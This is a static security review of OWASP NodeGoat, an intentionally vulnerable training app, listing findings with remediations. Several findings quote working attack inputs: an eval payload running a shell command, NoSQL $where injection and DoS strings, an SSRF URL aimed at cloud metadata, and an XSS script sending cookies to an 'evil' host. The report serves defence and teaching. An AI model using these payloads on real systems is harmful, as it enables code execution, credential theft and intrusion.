# Security Review: OWASP NodeGoat

**Date:** 2026-10-10
**Scope:** Remote repository review of `https://github.com/OWASP/NodeGoat` at commit `c5cb68a7084e4ae7dcc60e6a98768720a81841e8` (shallow clone, default branch). Scoped to the routes and data-access layers: `server.js`, `app/routes/*.js`, `app/data/*.js`, `config/env/*.js`, `package.json`. Views/frontend markup reviewed only where routes feed them. Static analysis only: nothing was executed, installed, or contacted beyond the initial `git clone --depth 1`.
**Stack:** Node.js / Express, MongoDB (native driver), express-session, swig templates (autoescape off), needle (HTTP client), marked 0.3.5, bcrypt-nodejs (unused for login path).

**Remote-target notes:** this is a baseline review for this target (prior reports in `security-reviews/` cover a different codebase and are not comparable). The triage backlog was neither applied nor updated. The shallow clone has no git history, so history-dependent checks (secrets committed in the past) are out of scope — run a local full clone if that matters. Clone left in place at the reported temp path for inspection.

## Executive Summary

NodeGoat is an intentionally vulnerable training application, and the review confirms its planted flaws are present and exploitable: server-side JavaScript injection via `eval()` on contribution inputs, NoSQL injection through a `$where` string, an SSRF endpoint that echoes fetched content back to the caller, stored XSS enabled by disabled template autoescaping, plaintext password storage, and an admin page whose authorization check is commented out. Note that NodeGoat ships with many fixes present-as-comments — the code paths above are live while their remediations are commented out.

**Finding Counts:**
- Critical: 2
- High: 6
- Medium: 7
- Low: 4
- Informational: 2

## Since Last Review

Baseline review — no prior report for this repository.

## Critical and High Findings

### [SR-001] [CRITICAL] [Server-side JavaScript injection via eval() on contribution inputs]

**Location:** `app/routes/contributions.js:32-34`
**Category:** CWE-95 (Eval Injection)
**Confidence:** Confirmed
**Exploitability:** Requires authentication

**Description:**
`preTax`, `afterTax`, and `roth` request bodies are passed to `eval()`. `preTax=process.mainModule.require("child_process").execSync("id").toString()` executes with the server's privileges — full RCE. The `parseInt` replacement sits directly below in a comment block. The subsequent `isNaN` validations run after `eval`, so they mitigate nothing.

**Evidence:**
```js
const preTax = eval(req.body.preTax);
const afterTax = eval(req.body.afterTax);
const roth = eval(req.body.roth);
```

**Remediation:** Enable the commented fix: `parseInt(req.body.preTax, 10)` (reject NaN/negatives before storage). Never pass request data to `eval`/`new Function`.

**References:** CWE-95, OWASP A03:2021 Injection.

### [SR-002] [CRITICAL] [NoSQL injection in allocation threshold $where]

**Location:** `app/data/allocations-dao.js:77-79`
**Category:** CWE-943 (NoSQL Injection)
**Confidence:** Confirmed
**Exploitability:** Requires authentication

**Description:**
The `threshold` query parameter is interpolated into a MongoDB `$where` JavaScript expression. `?threshold=1'; return 1=='' || this.userId=='1` rewrites the predicate to return other users' allocation documents; `0';while(true){}'` locks the DB evaluator (DoS). `$where` runs JavaScript server-side, so string interpolation here is code injection. The commented fix (`parseInt` + range check) is correct.

**Evidence:**
```js
return {
    $where: `this.userId == ${parsedUserId} && this.stocks > '${threshold}'`
};
```

**Remediation:** Cast and range-check `threshold` before use (the commented `parsedThreshold` block), or drop `$where` entirely: `{ userId: parsedUserId, stocks: { $gt: parsedThreshold } }` — typed operators cannot be injected.

**References:** CWE-943, MongoDB `$where` security guidance, OWASP Injection.

### [SR-003] [HIGH] [Passwords stored and compared in plaintext]

**Location:** `app/data/user-dao.js:25,60-66`
**Category:** CWE-256 / CWE-916
**Confidence:** Confirmed
**Exploitability:** Offline — any DB read (SR-002 aids) exposes every credential

**Description:**
`addUser` stores the raw request password; `validateLogin` compares with `===`. The bcrypt fix is present as a comment (`bcrypt.hashSync` / `bcrypt.compareSync`) with the dependency already required but unused on this path. Any database exposure — injection, backup leak, compromised host — yields every user's password verbatim.

**Remediation:** Enable the commented bcrypt path (prefer `bcrypt` over abandoned `bcrypt-nodejs`), hash on signup, `compare` on login, and migrate existing rows by forcing resets.

**References:** CWE-916, OWASP Password Storage cheat sheet.

### [SR-004] [HIGH] [SSRF in research endpoint with response echo]

**Location:** `app/routes/research.js:14-28`
**Category:** CWE-918
**Confidence:** Confirmed
**Exploitability:** Requires authentication

**Description:**
The entire fetch destination is client-controlled: `req.query.url + req.query.symbol`, fetched via `needle.get`, and the response body is written straight back to the client (`res.write(body)`). This is a full read-SSRF primitive: `?url=http://169.254.169.254/latest/meta-data/&symbol=` retrieves cloud metadata, internal services on `localhost`/RFC1918 are reachable, and any internal page's content is returned to the caller. No scheme/host/IP validation exists anywhere on the path.

**Remediation:** Build the URL server-side from a fixed host (`https://api.example-stock-service.com/symbol/` + `encodeURIComponent(symbol)`), validate scheme `https:`, resolve DNS and reject private/loopback/link-local ranges, cap redirects, and return parsed JSON fields rather than raw upstream HTML.

**References:** CWE-918, OWASP SSRF Prevention cheat sheet.

### [SR-005] [HIGH] [Template autoescaping disabled — stored XSS across user content]

**Location:** `server.js:135-142` (sinks throughout views)
**Category:** CWE-79 (Stored XSS)
**Confidence:** Confirmed
**Exploitability:** Requires authentication to plant; victims are all users

**Description:**
`swig.setDefaults({ autoescape: false })` disables output encoding globally, so every rendered user-controlled value is raw HTML: profile fields (`firstName`, `lastName`, `website` — `profile.js:100-103` re-renders the very inputs the attacker just POSTed), memos (`memos.js:13` inserts, `:25-28` renders to every viewer), and user names. A memo of `<script>fetch('//evil?c='+document.cookie)</script>` fires for every authenticated visitor. The one encoded field (`profile.js:28`) uses `encodeForHTML` on a value placed in an `href` context — the code's own FIXME notes the context mismatch.

**Remediation:** Delete the `autoescape: false` override (swig's default is escaped). Encode per-context at any point raw HTML is genuinely needed, and serve memos through the configured `marked` pipeline only after sanitizing with DOMPurify — note `marked 0.3.5`'s `sanitize` option is not a reliable boundary (SR-020).

**References:** CWE-79, OWASP XSS Prevention cheat sheet, context-aware encoding.

### [SR-006] [HIGH] [Benefits admin page: authorization commented out plus cross-user modification]

**Location:** `app/routes/index.js:55-60`, `app/routes/benefits.js:29-35`
**Category:** CWE-285 / CWE-639
**Confidence:** Confirmed
**Exploitability:** Requires authentication (any non-admin user)

**Description:**
`/benefits` is registered with `isLoggedIn` only — the `isAdmin` variant exists as a comment. Any authenticated user gets the listing of all non-admin users and, worse, `updateBenefits` writes `benefitStartDate` for whichever `userId` the request body names (no ownership or role check on the parameter — IDOR on an employment/benefits datum). `displayBenefits` even hard-codes `user: { isAdmin: true }` into the template, disguising the missing server-side check.

**Remediation:** Enable the commented admin middleware on both verbs; in `updateBenefits`, derive the target from the session (`req.session.userId`) unless the caller is admin, and validate `benefitStartDate` format.

**References:** CWE-285, OWASP A01:2021.

### [SR-007] [HIGH] [IDOR: allocations readable for arbitrary user IDs]

**Location:** `app/routes/index.js:63` (`/allocations/:userId`), `app/data/allocations-dao.js:57-86`
**Category:** CWE-639
**Confidence:** Confirmed
**Exploitability:** Requires authentication

**Description:**
The route takes `userId` from the path and passes it to `getByUserIdAndThreshold`; nothing ties it to `req.session.userId`. Any logged-in user enumerates `/allocations/1`, `/allocations/2`, … reading other users' allocation documents (the DAO does `parseInt` the ID, which blocks operator injection but not the IDOR itself).

**Remediation:** Ignore the path parameter for non-admin callers and query by `req.session.userId`, or 403 when `parseInt(req.params.userId) !== req.session.userId && !user.isAdmin`.

**References:** CWE-639, API1:2019 BOLA.

### [SR-008] [HIGH] [Hardcoded session cookie and crypto secrets in config]

**Location:** `config/env/all.js:5-6`
**Category:** CWE-798
**Confidence:** Confirmed
**Exploitability:** Direct — values are public in the repo

**Description:**
`cookieSecret: "session_cookie_secret_key_here"` and `cryptoKey: "a_secure_key_for_crypto_here"` (used with `aes256`) are committed defaults. With the cookie secret public, anyone can forge validly-signed session cookies — including an `isAdmin`-bearing session for the user document of their choice — bypassing authentication wholesale. The crypto key similarly decrypts anything encrypted with it.

**Remediation:** Read both from required environment variables with fail-fast validation (`if (!process.env.COOKIE_SECRET) throw …`), rotate deployments that ran with these defaults, and keep `config/env/production.js` free of literal secrets.

**References:** CWE-798, express-session secret guidance.

## Medium and Low Findings

### [SR-009] [MEDIUM] [No CSRF protection on all state-changing endpoints]

**Location:** `server.js:7,104-113` (csurf commented out)
**Category:** CWE-352
**Confidence:** Confirmed

Session-cookie authentication with no CSRF tokens on any POST (`/profile`, `/contributions`, `/benefits`, `/memos`, `/login`). An attacker page can silently rewrite a victim's bank account/routing/SSN via `POST /profile` — a payroll-diversion primitive. Enable the commented `csurf()` middleware and token plumbing, and set `sameSite: 'lax'` (or `strict`) on the session cookie.

### [SR-010] [MEDIUM] [Session fixation: login does not regenerate the session ID]

**Location:** `app/routes/session.js:116` (fix commented; signup at `:234` does regenerate)
**Category:** CWE-384
**Confidence:** Confirmed

`handleLoginRequest` reuses the pre-authentication session object; an attacker who plants a session ID (via subdomain cookie injection or an unauthenticated page that sets it) inherits the victim's authenticated session. Wrap the assignment in `req.session.regenerate(() => { req.session.userId = user._id; … })`, as signup already does.

### [SR-011] [MEDIUM] [Account enumeration via distinct login errors]

**Location:** `app/routes/session.js:60-98`
**Category:** CWE-204
**Confidence:** Confirmed

"Invalid username" vs "Invalid password" (the unified-message fix is commented out at `:86-87`). Use one generic message and equalize work for unknown users (dummy hash compare).

### [SR-012] [MEDIUM] [Password policy accepts any 1-character password]

**Location:** `app/routes/session.js:144` (`/^.{1,20}$/`)
**Category:** CWE-521
**Confidence:** Confirmed

The regex enforces only "1–20 chars" while the error message claims "8 to 18 characters … numbers, lowercase and uppercase" — the stronger regex exists as a comment. Combined with SR-003 (plaintext storage), credential strength is defenseless. Enable the commented pattern (and raise the ceiling above 20 to permit passphrases).

### [SR-013] [MEDIUM] [ReDoS in bank routing validation]

**Location:** `app/routes/profile.js:59` (`/([0-9]+)+\#/`)
**Category:** CWE-1333
**Confidence:** Confirmed

Nested quantifier over digits with a `#` terminator — a long digit string without `#` (e.g., 30 digits) causes catastrophic backtracking, pinning the request thread. The adjacent comment shows the fix: `/([0-9]+)\#/`. Also anchor it (`/^([0-9]+)#$/`) and cap input length.

### [SR-014] [MEDIUM] [Sensitive PII (SSN, DOB, bank details) stored and served in plaintext over HTTP]

**Location:** `app/routes/profile.js:44-50`, `server.js:144-147` (HTTPS variant commented out)
**Category:** CWE-312 / A02:2021
**Confidence:** Confirmed

The profile holds SSN, DOB, address, bank account, and routing number unencrypted, and the server is HTTP-only. Any network observer or DB reader gets full financial identity data. Serve over TLS (the commented `https.createServer` path), encrypt sensitive columns with a properly-managed key, and mask values in rendered pages.

### [SR-015] [MEDIUM] [Open redirect on /learn]

**Location:** `app/routes/index.js:70-73`
**Category:** CWE-601
**Confidence:** Confirmed

`res.redirect(req.query.url)` with no validation — `?url=//evil.com` or an absolute URL sends users off-site from the trusted origin. Restrict to same-site relative paths (`startsWith('/') && !startsWith('//')`).

### [SR-016] [LOW] [Log injection via unsanitized username]

**Location:** `app/routes/session.js:64`
**Category:** CWE-117
**Confidence:** Confirmed

`userName` is logged raw on failed login; CRLF sequences forge log entries. The commented ESAPI/strip fixes are correct — encode or strip `\r\n` before logging.

### [SR-017] [LOW] [Session cookie hardening and session-store hygiene]

**Location:** `server.js:78-102`
**Category:** CWE-614 / CWE-539
**Confidence:** Confirmed

`saveUninitialized: true` creates sessions for anonymous visitors; `resave: true` hammers the store; no `secure`/`sameSite`/`maxAge` on the cookie (httpOnly defaults on). Set `saveUninitialized: false`, `resave: false`, `cookie: { secure: true, sameSite: 'strict', maxAge: … }`, and use a real session store (MongoDB-backed) rather than memory.

### [SR-018] [LOW] [Security headers absent (helmet commented out)]

**Location:** `server.js:38-65`
**Category:** CWE-693
**Confidence:** Confirmed

CSP, HSTS, frame-ancestors, nosniff, and `x-powered-by` suppression are all present-as-comments. Enable `helmet()` with a CSP appropriate to the app's scripts.

### [SR-019] [LOW] [No rate limiting on login or anywhere else]

**Location:** `app/routes/index.js:33-34`
**Category:** CWE-307
**Confidence:** Confirmed

Unthrottled `POST /login` permits online brute force (mitigated only by SR-011's absent fix making it easier). Add per-account and per-IP limits with exponential backoff.

## Informational Notes

### [SR-020] [INFORMATIONAL] [Dependency age: marked 0.3.5, bcrypt-nodejs 0.0.3, express-session 1.x, swig abandoned]

**Location:** `package.json`

`marked 0.3.5` (2015-era; its `sanitize` option has known bypasses and is not a security boundary), `bcrypt-nodejs` (abandoned — use `bcrypt`/`argon2`), `swig` (unmaintained since ~2016), `express-session ^1.13` (very old within the 1.x line). A lockfile exists, which is good. This review cannot reliably enumerate CVEs by eye — run `osv-scanner` / `npm audit` and enable Dependabot.

### [SR-021] [INFORMATIONAL] [Tutorial pages mounted without authentication]

**Location:** `app/routes/index.js:79`, `app/routes/tutorial.js`

`/tutorial/*` renders static educational pages unauthenticated. No user data flows through it; noted only because it advertises the app's vulnerability map to any visitor (irrelevant for a training app, a pattern to avoid in real ones).

## Positive Observations

- **Signup regenerates the session ID** (`session.js:234`) — the correct fixation fix, applied on one of the two auth paths.
- **DAOs cast IDs with `parseInt`** before querying (`user-dao.js:99`, `benefits-dao.js:25`, `allocations-dao.js:29,58`) — this blocks MongoDB operator injection (`$gt` objects) on those paths, even though it doesn't fix the IDOR (SR-007).
- **Standard queries use typed operators, not string-built filters** — apart from the `$where` case (SR-002), the Mongo access layer avoids string interpolation.
- **Logout destroys the session** (`session.js:121-123`) rather than merely clearing a client cookie.
- **The remediation knowledge is already in the codebase** — most fixes exist as commented blocks, making remediation mechanical.

## Recommendations Summary

**Immediate:** enable the commented fixes for `eval` (SR-001), `$where` (SR-002), bcrypt (SR-003), and admin middleware (SR-006); move `cookieSecret`/`cryptoKey` to environment (SR-008); constrain the research fetch (SR-004).
**Short term:** restore autoescaping (SR-005), add csurf (SR-009), session regeneration on login (SR-010), unified login errors + rate limiting (SR-011, SR-019), password policy (SR-012), ReDoS regex (SR-013), HTTPS (SR-014).
**Longer term:** helmet/CSP, session store + cookie hygiene (SR-017, SR-018), dependency refresh with `osv-scanner` in CI (SR-020), PII encryption (SR-014).

---

*Report generated by `/security-review` v2.1.0 (remote repository target) · skill source: github.com/natolitech/security-skill · static analysis only; no reviewed code was executed; the only network operation was the user-directed `git clone --depth 1` of this repository.*
